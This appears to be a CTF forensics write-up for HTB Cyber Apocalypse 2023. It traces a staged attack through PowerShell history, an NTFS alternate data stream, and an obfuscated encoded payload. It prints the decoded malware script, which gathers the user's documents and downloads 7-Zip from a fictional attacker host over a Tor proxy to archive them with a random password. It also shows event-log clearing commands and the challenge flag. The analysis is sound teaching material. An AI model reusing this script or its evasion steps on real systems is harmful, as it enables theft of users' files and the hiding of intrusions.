---
layout: post
title: "HTB Cyber Apocalypse CTF 2023- Artifacts of Dangerous Sightings [Forensic]"
categories: ctf
tags: fore blast_o mz4b
date: 2023-03-24 10:00:00 +0100
author: blast_o, mz4b
---

# Artifacts of Dangerous Sightings - Difficulty: medium

### `Pandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces ...`

<br>
<br>

We are given the following file `2023-03-09T132449_PANDORA.vhdx`


By analyzing the available evidences, we found the following interesting file:

`C\Users\Pandora\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
```powershell
type finpayload > C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1
exit
Get-WinEvent
Get-EventLog -List
wevtutil.exe cl "Windows PowerShell" 
wevtutil.exe cl Microsoft-Windows-PowerShell/Operational
Remove-EventLog -LogName "Windows PowerShell"
Remove-EventLog -LogName Microsoft-Windows-PowerShell/Operational
Remove-EventLog
```


The command `type finpayload > C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1` is used to redirect the output of the `type finpayload"` command to the file `hidden.ps1` inside the file `ActiveSyncProvider.dll` located in the `C:\Windows\Tasks` folder.

The contents of `finpayload` are written to  "hidden.ps1" that is hidden inside the `ActiveSyncProvider.dll` file, as an **Alternate Data Stream**. Alternate Data Streams (ADS) are a file attribute only found on the NTFS file system.

By using the `Get-Item` command in PowerShell we can check all the data streams of the `ActiveSyncProvider.dll` file

``` powershell
Get-Item .\ActiveSyncProvider.dll -stream *

PSPath        : Microsoft.PowerShell.Core\FileSystem::D:\CTF\HTBCTF\forensics_artifacts_of_dangerous_sightings\ActiveSyncProvider.dll::$DATA                PSParentPath  : Microsoft.PowerShell.Core\FileSystem::D:\CTF\HTBCTF\forensics_artifacts_of_dangerous_sightings                                              PSChildName   : ActiveSyncProvider.dll::$DATA                                                                                                               PSDrive       : D                                                                                                                                           PSProvider    : Microsoft.PowerShell.Core\FileSystem                                                                                                        PSIsContainer : False                                                                                                                                       FileName      : D:\CTF\HTBCTF\forensics_artifacts_of_dangerous_sightings\ActiveSyncProvider.dll                                                             Stream        : :$DATA                                                                                                                                      Length        : 1707520  

PSPath        : Microsoft.PowerShell.Core\FileSystem::D:\CTF\HTBCTF\forensics_artifacts_of_dangerous_sightings\ActiveSyncProvider.dll:hidden.ps1            PSParentPath  : Microsoft.PowerShell.Core\FileSystem::D:\CTF\HTBCTF\forensics_artifacts_of_dangerous_sightings                                              PSChildName   : ActiveSyncProvider.dll:hidden.ps1                                                                                                           PSDrive       : D                                                                                                                                           PSProvider    : Microsoft.PowerShell.Core\FileSystem                                                                                                        PSIsContainer : False                                                                                                                                       FileName      : D:\CTF\HTBCTF\forensics_artifacts_of_dangerous_sightings\ActiveSyncProvider.dll                                                             Stream        : hidden.ps1                                                                                                                                  Length        : 175838    

```

We can now see what is inside this ADS:
``` powershell
Get-Content .\ActiveSyncProvider.dll -stream hidden.ps1

powerShell.exe -WindowStyle hiddeN -ExecuTionPolicy ByPasS -enc JAB7AFsAfgBAAH0AIAA9ACAAJAAoACkAOwAgACQAewAhACEAQAAhACEAXQB9ACAAPQAgACsAKwAkAHsAWwB+AEAAfQA7ACAAJAB7AFsAWwAhAH0AIAA9ACAALQAtACQAewBbAH4AQAB9ACAAKwAgACQAewAhACEAQAAhACEAXQB9ACAAKwAgACQAewAhACEAQAAhACEAXQB9ADsAIAAkAHsAfgB+AH4AXQB9ACAAPQAgACQAewBbAFsAIQB9ACAAKwAgACQAewAhACEAQAAhACEAXQB9ADsAIAAkAHsAWwAhACEAWwAhAH0AIAA9ACAAJAB7AFsAWwAhAH0AIAArACAAJAB7AFsAWwAhAH0AOwAgACQAewAoAH4AKAAhAH0AIAA9ACAAJAB7AH4AfgB...

```

Let's decode the b64 string found:
```
${[~@} = $(); ${!!@!!]} = ++${[~@}; ${[[!} = --${[~@} + ${!!@!!]} + ${!!@!!]}; ${~~~]} = ${[[!} + ${!!@!!]}; ${[!![!} = ${[[!} + ${[[!}; ${(~(!} = ${~~~]} + ${[[!}; ${!~!))} = ${[!![!} + ${[[!}; ${((!} = ${!!@!!]} + ${[!![!} + ${[[!}; ${=!!@!!}  = ${~~~]} - ${!!@!!]} + ${!~!))}; ${!=} =  ${((!} - ${~~~]} + ${!~!))} - ${!!@!!]}; ${=@!~!} = "".("$(@{})"[14]+"$(@{})"[16]+"$(@{})"[21]+"$(@{})"[27]+"$?"[1]+"$(@{})"[3]); ${=@!~!} = "$(@{})"[14]+"$?"[3]+"${=@!~!}"[27]; ${@!=} = "["+"$(@{})"[7]+"$(@{})"[22]+"$(@{})"[20]+"$?"[1]+"]";
"${@!=}${~~~]}${(~(!} + ${@!=}${~~~]}${(~(!} + ${@!=}${~~~]}${(~(!} + ${@!=}${~~~]}${[[!} + ${@!=}${[!![!}${!~!))} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${[!![!}${!~!))} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${[!![!}${!~!))} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${[!![!}${!~!))} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${[!![!}${!~!))} + ${@!=}${~~~]}${[[!} + ${@!=}${[!![!}${!~!))} + ${@!=}${~~~]}${[[!} + ${@!=}${~~~]}${[[!} + ${@!=}${ ...
```

This is obfuscated Powershell code, we modify it to be able to execute it safely and the following command is what is finally executed:

```
[Char]35 + [Char]35 + [Char]35 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]43 + [Char]32 + [Char]32 + [Char]46 + [Char]10 + [Char]35 + [Char]35 + [Char]35 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]32 + [Char]46 + [Char]32 + [Char]32 + [Char]58 + [Char]32 + ... | iex
```

Finally, we can decode that output with a simple pytohn script and get the flag:

```python
with open('chars.txt', 'r') as file:
    input_str = file.read()
output_str = ''
for char in input_str.split(' + '):
    char = char.strip('[Char]')
    output_str += chr(int(char))

print(output_str)
```
```powershell
### .     .       .  .   . .   .   . .    +  .
###   .     .  :     .    .. :. .___---------___.
###        .  .   .    .  :.:. _".^ .^ ^.  '.. :"-_. .
###     .  :       .  .  .:../:            . .^  :.:\.
###         .   . :: +. :.:/: .   .    .        . . .:\
###  .  :    .     . _ :::/:                         .:\
###   .. . .   . - : :.:./.                           .:\
###  .   .     : . : .:.|. ######               #######::|
###   :.. .  :-  : .:  ::|.#######             ########:|
###  .  .  .  ..  .  .. :\ ########           ######## :/
###   .        .+ :: : -.:\ ########         ########.:/
###     .  .+   . . . . :.:\. #######       #######..:/
###       :: . . . . ::.:..:.\                   ..:/
###    .   .   .  .. :  -::::.\.       | |       .:/
###       .  :  .  .  .-:.":.::.\               .:/
###  .      -.   . . . .: .:::.:.\            .:/
### .   .   .  :      : ....::_:..:\   ___   :/
###    .   .  .   .:. .. .  .: :.:.:\       :/
###      +   .   .   : . ::. :.:. .:.|\  .:/|
### SCRIPT TO DELAY HUMAN RESEARCH ON RELIC RECLAMATION
### STAY QUIET - HACK THE HUMANS - STEAL THEIR SECRETS - FIND THE RELIC
### GO ALLIENS ALLIANCE !!!
function makePass
{
    $alph=@();
    65..90|foreach-object{$alph+=[char]$_};
    $num=@();
    48..57|foreach-object{$num+=[char]$_};

    $res = $num + $alph | Sort-Object {Get-Random};
    $res = $res -join '';
    return $res;
}

function makeFileList
{
    $files = cmd /c where /r $env:USERPROFILE *.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php;
    $List = $files -split '\r';
    return $List;
}

function compress($Pass)
{
    $tmp = $env:TEMP;
    $s = 'https://relic-reclamation-anonymous.alien:1337/prog/';
    $link_7zdll = $s + '7z.dll';
    $link_7zexe = $s + '7z.exe';

    $7zdll = '"'+$tmp+'\7z.dll"';
    $7zexe = '"'+$tmp+'\7z.exe"';
    cmd /c curl -s -x socks5h://localhost:9050 $link_7zdll -o $7zdll;
    cmd /c curl -s -x socks5h://localhost:9050 $link_7zexe -o $7zexe;

    $argExtensions = '*.pdf *.doc *.docx *.xls *.xlsx *.pptx *.ppt *.txt *.csv *.htm *.html *.php';

    $argOut = 'Desktop\AllYourRelikResearchHahaha_{0}.zip' -f (Get-Random -Minimum 100000 -Maximum 200000).ToString();
    $argPass = '-p' + $Pass;

    Start-Process -WindowStyle Hidden -Wait -FilePath $tmp'\7z.exe' -ArgumentList 'a', $argOut, '-r', $argExtensions, $argPass -ErrorAction Stop;
}

$Pass = makePass;
$fileList = @(makeFileList);
$fileResult = makeFileListTable $fileList;
compress $Pass;
$TopSecretCodeToDisableScript = "HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}"
```
